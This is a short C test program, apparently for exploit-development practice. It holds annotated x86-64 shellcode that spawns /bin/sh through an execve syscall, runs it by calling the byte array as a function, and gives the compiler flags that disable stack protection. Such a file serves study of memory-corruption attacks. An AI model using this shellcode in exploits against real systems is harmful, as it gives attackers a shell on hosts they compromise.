#include <stdio.h>
#include <string.h>

/**
 * clang -z execstack -fno-stack-protector -o simple_stack_overflow_test2 simple_stack_overflow_test2.c
 */
char shellcode[] =
    "\x48\x31\xd2"                             // xor    %rdx,%rdx
    "\x48\x31\xc0"                             // xor    %rax,%rax
    "\x50"                                     // push   %rax
    "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" // movabs $0x68732f2f6e69622f,%rbx
    "\x53"                                     // push   %rbx
    "\x48\x89\xe7"                             // mov    %rsp,%rdi
    "\x52"                                     // push   %rdx
    "\x57"                                     // push   %rdi
    "\x48\x89\xe6"                             // mov    %rsp,%rsi
    "\xb0\x3b"                                 // mov    $0x3b,%al
    "\x0f\x05";                                // syscall

int main()
{
  printf("len:%lu bytes\n", strlen(shellcode));
  (*(void(*)()) shellcode)();
  return 0;
}